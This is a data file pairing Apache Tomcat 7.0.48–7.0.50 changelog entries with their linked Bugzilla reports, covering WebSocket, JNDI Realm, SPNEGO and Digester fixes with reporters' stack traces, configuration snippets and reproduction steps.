Catalina|Tomcat 7.0.50 (violetagg)|fix||Handle the case where a WebSocket annotation configures a message size limit larger than the default permitted by Tomcat. (markt)|||
Catalina|Tomcat 7.0.50 (violetagg)|fix|55855|This is a partial fix that bypasses the relatively expensive check for a WebSocket upgrade request if no WebSocket endpoints have been registered. (markt)|Unexpected WsFilter is configured in a webapp that does not use WebSocket|"Reproducible in Tomcat 7 on 7.0.47 and on the current 7.0.x (@ r1548765).
I have not tested Tomcat 8.

Steps to reproduce:
1. Create the file webapps/ROOT/test.jsp in the default ROOT web application.
[[[
<% throw new RuntimeException(); %>
]]]

2. Configure JAVA_HOME to point to a Java 7 JRE (7u45).
3. Start Tomcat
4. Browse http://localhost:8080/test.jsp
The following stacktrace is printed on the error page and into the log files:
[[[
org.apache.jasper.JasperException: An exception occurred processing JSP page /test.jsp at line 1

1: <% throw new RuntimeException(); %>


Stacktrace:
	org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:568)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:470)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
]]]


The ""WsFilter"" in the stacktrace is unexpected, as the default ROOT web application does not use WebSockets."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55855
Catalina|Tomcat 7.0.50 (violetagg)|fix|55905|Prevent a NPE when web.xml references a taglib file that does not exist. Provide better error message. (violetagg)|Error message unhelpful when web.xml references a tld file that doesn't exist|"In your web-application web.xml add a taglib element but get the taglib-location wrong or forgot to include *.tld when packaging your archive

  <jsp-config>
    <taglib>
        <taglib-uri>http://www.example.org/mytaglib</taglib-uri>
        <taglib-location>/WEB-INF/wrong.tld</taglib-location>
    </taglib>
  </jsp-config>

Start you web-app.

Expected:

Get a helpful message like

WARN  org.apache.catalina.startup.TldConfig - Failed to process TLD with path [/WEB-INF/wrong.tld] and URI [http://www.example.org/mytaglib]
java.io.FileNotFoundException: /WEB-INF/wrong.tld
...

Actual:

WARN  org.apache.catalina.startup.TldConfig - Failed to process TLD with path [http://www.example.org/mytaglib] and URI [/WEB-INF/wrong.tld]
java.net.MalformedURLException: null
...

Note also that with the current error message the path is labelled at the URI and vice versa, adding to the confusion."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55905
Coyote|Tomcat 7.0.50 (violetagg)|fix||When using the BIO connector with an internal executor, do not display a warning that the executor has not shutdown as the default configuration for BIO connectors is not to wait. This is because threads in keep-alive connections cannot be interrupted and therefore the warning was nearly always displayed. (markt)|||
Jasper|Tomcat 7.0.50 (violetagg)|fix||JspC uses servlet context initialization parameters to pass configuration so ensure that the servlet context used supports initialization parameters. (markt)|||
Cluster|Tomcat 7.0.50 (violetagg)|fix||In AbstractReplicatedMap#finalize, remove rpcChannel from channel Listener of group channel before sending MapMessage.MSG_STOP message. This prevents that the node that sent the MapMessage.MSG_STOP by normal shutdown is added to member map again by ping at heartbeat thread in the node that received the MapMessage.MSG_STOP. (kfujino)|||
Cluster|Tomcat 7.0.50 (violetagg)|fix||Add time stamp to GET_ALL_SESSIONS message. (kfujino)|||
Web applications|Tomcat 7.0.50 (violetagg)|fix||Fix the sample configuration of StaticMembershipInterceptor in order to prevent warning log. uniqueId must be 16 bytes. (kfujino)|||
Extras|Tomcat 7.0.50 (violetagg)|update||Update dependencies that are used to build tomcat-juli extras component. Apache Avalon Framework is updated to version 4.1.5, Apache Log4J to version 1.2.17. (rjung)|||
Catalina|Tomcat 7.0.49 (violetagg)|fix||Correct a regression in the new XML local resolver that triggered false failures when XML validation was configured. (markt)|||
Catalina|Tomcat 7.0.49 (violetagg)|fix||Prevent a NPE when destroying HTTP upgrade handler for WebSocket connections. (violetagg)|||
Catalina|Tomcat 7.0.48 (violetagg)|add|51294|Add support for unpacking WARs located outside of the Host's appBase in to the appBase. (markt)|Since 7.0.12 do not work option unpackWARs=true for WARs outside appBase|"In 7.0.12 was added in Changelog this line:
--
Don't unpack WAR files if they are not located in the Host's appBase. (markt)
--
It's change method of deployment from older versions of Tomcat (5.5, 6.0, 7.0.11) and forced to change logics on early configured servers.

May be need to add new parameter like 'unpackExternalWARs=true' to be able to configure this? (Why outside WARs is worse than inside?)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51294
Catalina|Tomcat 7.0.48 (violetagg)|fix|55656|Configure the Digester to use the server class loader when parsing server.xml rather than the class loader that loaded StandardServer. Patch provided by Roberto Benedetti. (markt)|Server ClassLoader not used for Server creation|"Created attachment 30931 [details]
proposed patch

When configuring server.loader in catalina.properties with libraries containing valves or realms and their dependencies, if those classes are set in server.xml a CNFE is thrown.

The reason is Digester using StandardServer's ClassLoader and not context ClassLoader."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55656
Catalina|Tomcat 7.0.48 (violetagg)|fix|55664|Correctly handle JSR 356 WebSocket Encoder, Decoder and MessageHandler implementations that use a generic type such as Encoder.Text<List<String>>. Includes a test case by Niki Dokovski. (markt)|[websocket] NPE in Util$DecoderMatch during application start|"Created attachment 30934 [details]
TestEncodingDecoding.patch

NPE is thrown when WS endpoint has associated encoder or decoder with type using generics. Example: Decoder.Text<List<String>>

Here I attach patch of org.apache.tomcat.websocket.pojo.TestEncodingDecoding illustrating the case."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55664
Catalina|Tomcat 7.0.48 (violetagg)|fix||Correctly handle WebSocket Encoders, Decoders and MessageHandlers that use arrays of generic types. (markt)|||
Catalina|Tomcat 7.0.48 (violetagg)|fix|55681|Ensure that the WebSocket session is made available to MessageHandler method calls. (markt)|JSR-356 message handling: NULL pointer being thrown when DecodeException is caught in PojoMessageHandlerWholeBase<T>.onMessage|"I am testing what happens when Encode/Decode Exceptions occur during JSR-356 communication.  In our case, we do NOT use annotation, but we ""extend Endpoint"" and ""implement Whole<ThingworxMessage>"".  I was forcing a DecodeException to occur - expecting to my onError to be called with the actual DecodeException.  Instead, I got a Null.  

Stepping the following code in Tomcat:

in onMessage, the ((WsSession)session) is NULL.  As a result, the actual DecodeException (cause) is lost.

       // Can this message be decoded?
        Object payload;
        try {
            payload = decode(message);
        } catch (DecodeException de) {
            ((WsSession) session).getLocal().onError(session, de);
            return;
        }


Tracing this further up the stack, I found that Util.getMessageHandlers is initializing it and passing NULL in for the session:

            if (decoderMatch.getTextDecoders().size() > 0) {
                MessageHandlerResult result = new MessageHandlerResult(
                        new PojoMessageHandlerWholeText(listener, m, null,
                                endpointConfig,
                                decoderMatch.getTextDecoders(), new Object[1],
                                0, false, -1, -1),
                        MessageHandlerResultType.TEXT);
                results.add(result);
            }

Please let me know if I can provide any more details.

-bob"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55681
Catalina|Tomcat 7.0.48 (violetagg)|fix||Updated servlet spec version and documentation section-number reported when JAR files are rejected for containing a trigger class (e.g. javax.servlet.Servlet). (schultz)|||
Catalina|Tomcat 7.0.48 (violetagg)|add||Modify the WebSocket handshake process so that the user properties Map exposed by the ServerEndpointConfig during the call to Configurator.modifyHandshake() is unique to the connection rather than shared by all connections associated with the Endpoint. This allows for easier configuration of per connection properties from within modifyHandshake(). (markt)|||
Catalina|Tomcat 7.0.48 (violetagg)|fix|55684|Log a warning but continue if the memory leak detection code is unable to access all threads to check for possible memory leaks when a web application is stopped. (markt)|WebappClassLoader.getThread want an access to root ThreadGroup|"Tomcat may not have all permissions granted.
The method WebappClassLoader.getThread try to access the root ThreadGroup in order to list all threads.
You should either manage SecurityException or avoid to access the parent ThreadGroup of the thread which start Tomcat."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55684
Catalina|Tomcat 7.0.48 (violetagg)|fix||Define the web-fragment.xml in tomcat7-websocket.jar as a Servlet 3.0 web fragment rather than as a Servlet 3.1 web fragment. (markt)|||
Catalina|Tomcat 7.0.48 (violetagg)|fix|55715|Add a per web application executor to the WebSocket implementation and use it for calling SendHandler.onResult() when there is a chance that the current thread also initiated the write. (markt)|RemoteEndpoint.Async#sendText(String, SendHandler) can cause StackOverflowErrors and contradicts Oracle's JavaDoc|"See thread on users list [1]:

Tomcat's current implementation of RemoteEndpoint.Async#sendText(String, SendHandler) can cause StackOverflowErrors (and seems to contradict Oracle's JavaDoc).

In Tomcat, Async#sendText(...) seems to implemented so that when it could send all of the data immediately, then it directly calls SendHandler#onResult(...); whereas when it couldn't send the data immediately, the SendHandler will be called from another thread.

Oracle's javadoc for RemoteEndpoint.Async says:

""The completion handlers for the asynchronous methods are always called with a different thread from that which initiated the send.""

Now, imagine the case that you want to send 10000 very small text messages to a client (very unlikely, but possibly could happen). With synchronous I/O (RemoteEndpoint.Basic), you would do this in this way:

        RemoteEndpoint.Basic basic = session.getBasicRemote();
        for (int i = 0; i < 10000; i++) {
            basic.sendText(""Hi, Count: "" + i);
        }

In this case, there is no problem.

Now imagine you want to do this asynchronously (using a Callback to be informed when sending is completed), then you could do it this way (e.g. put the following code in onOpen() method of Tomcat's EchoEndpoint example):

        final AtomicInteger aint = new AtomicInteger();
        final RemoteEndpoint.Async async = session.getAsyncRemote();
        
        SendHandler handler = new SendHandler() {
            @Override
            public void onResult(SendResult result) {
                int nextVal = aint.incrementAndGet();
                if (nextVal < 10000) {
                    async.sendText(""Hi, Count: "" + nextVal, this);
                }
            }
        };
        async.sendText(""Hi, Count: "" + aint.get(), handler);

The problem here is that because the messages are very short, Tomcat will be able to send them immediately, calling the SendHandler#onResult() directly from Async.sendText(), which will eventually cause a StackOverflowError.

I think if SendHandler#onResult() was always called from a different thread than the one which calls Async.send... (like the Javadoc says), then although the performance would probably be worse, StackOverflowErrors shouldn't occur.


[1] http://markmail.org/message/gpxzdwtxtrpynvux"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55715
Catalina|Tomcat 7.0.48 (violetagg)|fix||Prevent file descriptors leak and ensure that files are closed when configuring the web application. (violetagg)|||
Catalina|Tomcat 7.0.48 (violetagg)|fix||Fixed the name of the provider-configuration file located in tomcat7-websocket.jar!/META-INF/services that exposes information for javax.websocket.server.ServerEndpointConfig$Configurator implementation. (violetagg)|||
Catalina|Tomcat 7.0.48 (violetagg)|fix|55760|Remove the unnecessary setting of the javax.security.auth.useSubjectCredsOnly system property in the SpnegoAuthenticator as in addition to it being unnecessary, it causes problems with using SPNEGO with IBM JDKs. Patch provided by Arunav Sanyal. (markt)|Tomcat SPNEGO authenticator incompatible with IBM JDK in case of Keytab based initiate and accept authentication|"Hi

Our company has a use case in which our domain is a tomcat process. In our code, we support a parallel protocol which uses In memory based jaas configuration - 

public class OurLoginConfiguration extends Configuration

In IBM JDK 7, we need to initiate using keytab which needs the system property javax.security.auth.useSubjectCredsOnly to be set to true for it to work. However Tomcat sets it in  

Inside SpnegoAuthenticator:-

 protected void initInternal() throws LifecycleException {
        super.initInternal();

        // Kerberos configuration file location
        String krb5Conf = System.getProperty(Constants.KRB5_CONF_PROPERTY);
        if (krb5Conf == null) {
            // System property not set, use the Tomcat default
            File krb5ConfFile = new File(Bootstrap.getCatalinaBase(),
                    Constants.DEFAULT_KRB5_CONF);
            System.setProperty(Constants.KRB5_CONF_PROPERTY,
                    krb5ConfFile.getAbsolutePath());
        }

        // JAAS configuration file location
        String jaasConf = System.getProperty(Constants.JAAS_CONF_PROPERTY);
        if (jaasConf == null) {
            // System property not set, use the Tomcat default
            File jaasConfFile = new File(Bootstrap.getCatalinaBase(),
                    Constants.DEFAULT_JAAS_CONF);
            System.setProperty(Constants.JAAS_CONF_PROPERTY,
                    jaasConfFile.getAbsolutePath());
        }
        
        // This property must be false for SPNEGO to work
        System.setProperty(Constants.USE_SUBJECT_CREDS_ONLY_PROPERTY, ""false"");
    }

as false in the last line which causes havoc in the code. A multithreaded startup causes a breakdown in further authentication for keytab based logging.


Now a little more investigation revealed that tomcat acts only as an acceptor. Now this property need not necessarily be set to false for it to work(in both IBM and SUN JDK). 

Source of claim - http://cr.openjdk.java.net/~weijun/special/krb5winguide-2/raw_files/new/kwin

Excerpt:-
 2. Direct JGSS:

      /* JGSS-API calls... */

       In this case, the JAAS config file's entry name MUST be the
       standard entry name (com.sun.security.jgss.krb5.initiate), and you
       must set -Djavax.security.auth.useSubjectCredsOnly=false on the
       Java command line. Read
       [26]http://java.sun.com/javase/6/docs/technotes/guides/security/jgs
       s/tutorials/BasicClientServer.html for details.
Which means only initiate based auth needs the system property.

This is also confirmed in IBM with a sample program.

PROPOSED FIX: COMMENT LAST LINE OF initInternal WHICH SETS THE SYSTEM PROPERTY IN THE FIRST PLACE AS FALSE."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55760
Catalina|Tomcat 7.0.48 (violetagg)|fix|55772|Ensure that the request and response are recycled after an error during asynchronous processing. Includes a test case based on code contributed by Todd West. (markt)|Flushing AsyncContext response writer after ClientAbortException (BrokenPipe) causes request state to leak|"Created attachment 31040 [details]
Test case to reproduce request state (cookie) leakage

This issue is easily reproducible with the attached test case. Request state is leaked between requests due to the ADAPTER_NOTES note on the coyote request containing the catalina connector request (which holds the cookies from the first request) and never gets cleaned up in this error case (and maybe others similar to it).

It seems like it would be worthwhile to clear out the notes field from the coyote request when we recycle() it to prevent future issues like this."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55772
Catalina|Tomcat 7.0.48 (violetagg)|fix|55778|Add an option to the JNDI Realm to control the QOP used for the connection to the LDAP server after authentication when using SPNEGO with delegated credentials. This value is used to set the javax.security.sasl.qop environment property for the LDAP connection. (markt)|JNDIRealm: Authentication with GSSAPI to LDAP with SSL connection causes an exception|"Whenever i try to authenticate with GSSAPI to a LDAP server with a SSL connection (ldaps), the following exception is thrown:

javax.naming.ServiceUnavailableException: myserver.at:636; socket closed; remaining name 'dc=example,dc=org'
    at com.sun.jndi.ldap.Connection.readReply(Connection.java:452)
    at com.sun.jndi.ldap.LdapClient.getSearchReply(LdapClient.java:631)
    at com.sun.jndi.ldap.LdapClient.search(LdapClient.java:554)
    at com.sun.jndi.ldap.LdapCtx.doSearch(LdapCtx.java:1985)
    at com.sun.jndi.ldap.LdapCtx.searchAux(LdapCtx.java:1847)
    at com.sun.jndi.ldap.LdapCtx.c_search(LdapCtx.java:1772)
    ...

Steps to reproduce:
1. Configure the valve org.apache.catalina.authenticator.SpnegoAuthenticator in the server.xml with storeDelegatedCredential=""true"".
2. Configure the realm org.apache.catalina.realm.JNDIRealm in the server.xml with an SSL connection url (e.g. ldaps://myserver.at:636)
3. Configure an auth-method with SPNEGO, security-constraints and security-roles in the web.xml
4. Add required keystores to the jdk for the ldaps connection.
5. Try to authenticate

I debugged into the JNDIRealm and figured out, that changing line 2082 from ""context.addToEnvironment(""javax.security.sasl.qop"", ""auth-conf"");"" to ""context.addToEnvironment(""javax.security.sasl.qop"", ""auth"");"" would solve the problem. I also tested the fix with a new written JNDIRealm.

But i'm not sure, if this fix causes other security issues."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55778
Catalina|Tomcat 7.0.48 (violetagg)|fix|55798|Log an error if the MemoryUserDatabase is unable to find the specified user database file. (markt)|Enabling Manager App - process and description is inadequate||https://bz.apache.org/bugzilla/show_bug.cgi?id=55798
Catalina|Tomcat 7.0.48 (violetagg)|fix|55799|Correctly enforce the restriction in JSR356 that no more than one data message may be sent to a remote WebSocket endpoint at a time. (markt)|[websocket] Stability issues when concurrently sending large messages|"Created attachment 31055 [details]
Test case (modifications to the Chat example)

Hi,

a thread on the Users List [1] described that problems can occur when sending large messages over a WebSocket connection using getBasicRemote().sendText(String).

The ChatAnnotation class does not synchronize when using this method, which means that multiple threads could call RemoteEndpoint.Basic#sendText() concurrently.

The JavaDoc of RemoteEndpoint.Basic says:

""If the websocket connection underlying this RemoteEndpoint is busy sending a message when a call is made to send another one, for example if two threads attempt to call a send method concurrently, or if a developer attempts to send a new message while in the middle of sending an existing one, the send method called while the connection is already busy may throw an IllegalStateException.""

(I thought I had read earlier that the implementation should synchronize calls to methods of RemoteEndpoint.Basic instead of throwing an ISE, but maybe that has changed).


When sending large Messages over Websocket using RemoteEndpoint.Basic from different threads without or with synchronization, some problems happen like:
a) The WebSocket connection is suddenly closed (I guess the browser
   actually aborts the connections due to data corruption or Timeout errors,
   but I have not examined the raw data sent over TCP)
b) Various Exceptions occur (see below)
c) Sometimes when I open the chat.xhtml example in my browser, it shows what
   seems to be a raw WebSocket response instead of the .xhtml file (see
   added screenshots)

These issues also happen after synchronizing calls to RemoteEndpoint.Basic#sendText(), but are then harder to reproduce.



To reproduce: 
1) Checkout Tomcat 8 trunk (r1543467) and apply the attached patch. It applies some modifications to the Chat Websocket Example, so that the Javascript sends messages in a regular interval (50 ms), and the ChatAnnotation modifies the message to be 256 times as large as the original message, and sends it back using session.getBasicRemote()#sendText(msg). 

2) Build Tomcat and run it on a Windows machine (I used Windows 8.1 x64, Java 1.7.0_45 x64), using the NIO HTTP connector (default configuration).

3) Open Firefox and IE 11. With both browsers, open the Chat example (http://localhost:8080/examples/websocket/chat.xhtml).

4) Repeat the following actions in a regular interval:
   a) Wait several seconds (it might be that Tomcat already closes one of
      the two WebSocket connections in that time).
   b) On one of the browsers (e.g. IE), press F5 several times.

5) After some time, you can see that in one of the browsers, the WebSocket connection is suddenly closed. Tomcat will show one or more of the following exceptions (I think the IOException and ClosedChannelException are expected if the browser aborts the connection):


19-Nov-2013 23:18:39.809 SEVERE [http-nio-8080-ClientPoller-0] org.apache.tomcat.util.net.NioEndpoint.processSocket Error allocating socket processor
 java.lang.NullPointerException
	at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:624)
	at org.apache.tomcat.util.net.NioEndpoint$Poller.processKey(NioEndpoint.java:1165)
	at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:1122)
	at java.lang.Thread.run(Thread.java:744)


19-Nov-2013 23:32:16.601 SEVERE [http-nio-8080-exec-3] websocket.chat.ChatAnnotation.onError Chat Error: java.nio.channels.ClosedChannelException
 java.nio.channels.ClosedChannelException
	at sun.nio.ch.SocketChannelImpl.ensureReadOpen(SocketChannelImpl.java:252)
	at sun.nio.ch.SocketChannelImpl.read(SocketChannelImpl.java:295)
	at org.apache.tomcat.util.net.NioChannel.read(NioChannel.java:136)
	at org.apache.coyote.http11.upgrade.NioServletInputStream.fillReadBuffer(NioServletInputStream.java:136)
	at org.apache.coyote.http11.upgrade.NioServletInputStream.doIsReady(NioServletInputStream.java:49)
	at org.apache.coyote.http11.upgrade.AbstractServletInputStream.isReady(AbstractServletInputStream.java:62)
	at org.apache.tomcat.websocket.server.WsFrameServer.onDataAvailable(WsFrameServer.java:44)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler$WsReadListener.onDataAvailable(WsHttpUpgradeHandler.java:192)
	at org.apache.coyote.http11.upgrade.AbstractServletInputStream.onDataAvailable(AbstractServletInputStream.java:180)
	at org.apache.coyote.http11.upgrade.AbstractProcessor.upgradeDispatch(AbstractProcessor.java:95)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:640)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1555)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)


19-Nov-2013 23:32:19.658 SEVERE [http-nio-8080-exec-2] websocket.chat.ChatAnnotation.onError Chat Error: java.lang.IllegalArgumentException: java.lang.reflect.InvocationTargetException
 java.lang.IllegalArgumentException: java.lang.reflect.InvocationTargetException
	at org.apache.tomcat.websocket.pojo.PojoMessageHandlerWholeBase.onMessage(PojoMessageHandlerWholeBase.java:82)
	at org.apache.tomcat.websocket.WsFrameBase.sendMessageText(WsFrameBase.java:369)
	at org.apache.tomcat.websocket.WsFrameBase.processDataText(WsFrameBase.java:468)
	at org.apache.tomcat.websocket.WsFrameBase.processData(WsFrameBase.java:272)
	at org.apache.tomcat.websocket.WsFrameBase.processInputBuffer(WsFrameBase.java:116)
	at org.apache.tomcat.websocket.server.WsFrameServer.onDataAvailable(WsFrameServer.java:55)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler$WsReadListener.onDataAvailable(WsHttpUpgradeHandler.java:192)
	at org.apache.coyote.http11.upgrade.AbstractServletInputStream.onDataAvailable(AbstractServletInputStream.java:180)
	at org.apache.coyote.http11.upgrade.AbstractProcessor.upgradeDispatch(AbstractProcessor.java:95)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:640)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1555)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)
Caused by: java.lang.reflect.InvocationTargetException
	at sun.reflect.GeneratedMethodAccessor38.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.apache.tomcat.websocket.pojo.PojoMessageHandlerWholeBase.onMessage(PojoMessageHandlerWholeBase.java:80)
	... 15 more
Caused by: java.nio.charset.CoderMalfunctionError: java.nio.BufferOverflowException
	at java.nio.charset.CharsetEncoder.encode(CharsetEncoder.java:565)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase$TextMessageSendHandler.write(WsRemoteEndpointImplBase.java:624)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.sendPartialString(WsRemoteEndpointImplBase.java:197)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.sendString(WsRemoteEndpointImplBase.java:154)
	at org.apache.tomcat.websocket.WsRemoteEndpointBasic.sendText(WsRemoteEndpointBasic.java:37)
	at websocket.chat.ChatAnnotation.broadcast(ChatAnnotation.java:96)
	at websocket.chat.ChatAnnotation.incoming(ChatAnnotation.java:83)
	... 19 more
Caused by: java.nio.BufferOverflowException
	at java.nio.Buffer.nextPutIndex(Buffer.java:513)
	at java.nio.HeapByteBuffer.put(HeapByteBuffer.java:163)
	at org.apache.tomcat.util.buf.Utf8Encoder.encodeNotHasArray(Utf8Encoder.java:177)
	at org.apache.tomcat.util.buf.Utf8Encoder.encodeLoop(Utf8Encoder.java:40)
	at java.nio.charset.CharsetEncoder.encode(CharsetEncoder.java:561)
	... 25 more


19-Nov-2013 23:32:23.353 SEVERE [http-nio-8080-exec-10] websocket.chat.ChatAnnotation.onError Chat Error: java.io.IOException: Eine vorhandene Verbindung wurde vom Remotehost geschlossen
 java.io.IOException: Eine vorhandene Verbindung wurde vom Remotehost geschlossen
	at sun.nio.ch.SocketDispatcher.read0(Native Method)
	at sun.nio.ch.SocketDispatcher.read(SocketDispatcher.java:43)
	at sun.nio.ch.IOUtil.readIntoNativeBuffer(IOUtil.java:223)
	at sun.nio.ch.IOUtil.read(IOUtil.java:197)
	at sun.nio.ch.SocketChannelImpl.read(SocketChannelImpl.java:379)
	at org.apache.tomcat.util.net.NioChannel.read(NioChannel.java:136)
	at org.apache.coyote.http11.upgrade.NioServletInputStream.fillReadBuffer(NioServletInputStream.java:136)
	at org.apache.coyote.http11.upgrade.NioServletInputStream.doRead(NioServletInputStream.java:80)
	at org.apache.coyote.http11.upgrade.AbstractServletInputStream.read(AbstractServletInputStream.java:124)
	at org.apache.tomcat.websocket.server.WsFrameServer.onDataAvailable(WsFrameServer.java:46)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler$WsReadListener.onDataAvailable(WsHttpUpgradeHandler.java:192)
	at org.apache.coyote.http11.upgrade.AbstractServletInputStream.onDataAvailable(AbstractServletInputStream.java:180)
	at org.apache.coyote.http11.upgrade.AbstractProcessor.upgradeDispatch(AbstractProcessor.java:95)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:640)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1555)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)


If you try to press F5, then it might be that the Websocket connection is closed as soon as it was opened, or that the browser doesn't get a response for the request to chat.xhtml.



Now, add synchronization by modifying ChatAnnotation's broadcast() method:

    private static void broadcast(String msg) {
        for (ChatAnnotation client : connections) {
            synchronized (client) {
                try {
                    client.session.getBasicRemote().sendText(msg);
                } catch (Exception e) {
    
                }
            }
        }
    }

and repeat the above steps.

Now, if you open chat.xhtml with both IE and Firefox and do nothing, the WebSocket connection will not be closed. Even if you start to repeatedly press F5, most of the time everything will appear normal (besides getting IOExceptions and ClosedChannelExceptions).

However, after I tried this several minutes, I still got the problems that the WebSocket connections are closed just after opening it (or after some time), or that the browser didn't get a response to its HTTP request, or that the browser got a raw WebSocket reply instead of the XHTML page reply (see added screenshots).

I also got these exceptions:

20-Nov-2013 00:18:20.037 SEVERE [http-nio-8080-exec-9] websocket.chat.ChatAnnotation.onError Chat Error: java.io.IOException: java.util.concurrent.ExecutionException: java.io.IOException: Key must be cancelled
 java.io.IOException: java.util.concurrent.ExecutionException: java.io.IOException: Key must be cancelled
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessageBlock(WsRemoteEndpointImplBase.java:226)
	at org.apache.tomcat.websocket.WsSession.sendCloseMessage(WsSession.java:476)
	at org.apache.tomcat.websocket.WsSession.onClose(WsSession.java:439)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.close(WsHttpUpgradeHandler.java:172)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.access$200(WsHttpUpgradeHandler.java:45)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler$WsReadListener.onDataAvailable(WsHttpUpgradeHandler.java:194)
	at org.apache.coyote.http11.upgrade.AbstractServletInputStream.onDataAvailable(AbstractServletInputStream.java:180)
	at org.apache.coyote.http11.upgrade.AbstractProcessor.upgradeDispatch(AbstractProcessor.java:95)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:640)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1555)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)
Caused by: java.util.concurrent.ExecutionException: java.io.IOException: Key must be cancelled
	at org.apache.tomcat.websocket.FutureToSendHandler.get(FutureToSendHandler.java:102)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessageBlock(WsRemoteEndpointImplBase.java:222)
	... 14 more
Caused by: java.io.IOException: Key must be cancelled
	at org.apache.coyote.http11.upgrade.NioServletOutputStream.doWriteInternal(NioServletOutputStream.java:83)
	at org.apache.coyote.http11.upgrade.NioServletOutputStream.doWrite(NioServletOutputStream.java:60)
	at org.apache.coyote.http11.upgrade.AbstractServletOutputStream.writeInternal(AbstractServletOutputStream.java:118)
	at org.apache.coyote.http11.upgrade.AbstractServletOutputStream.write(AbstractServletOutputStream.java:85)
	at org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer.onWritePossible(WsRemoteEndpointImplServer.java:94)
	at org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer.doWrite(WsRemoteEndpointImplServer.java:81)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.writeMessagePart(WsRemoteEndpointImplBase.java:362)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessage(WsRemoteEndpointImplBase.java:259)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessageBlock(WsRemoteEndpointImplBase.java:217)
	... 14 more


20-Nov-2013 00:32:53.483 SEVERE [http-nio-8080-exec-3] org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun 
 java.lang.NullPointerException
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:593)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1555)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)


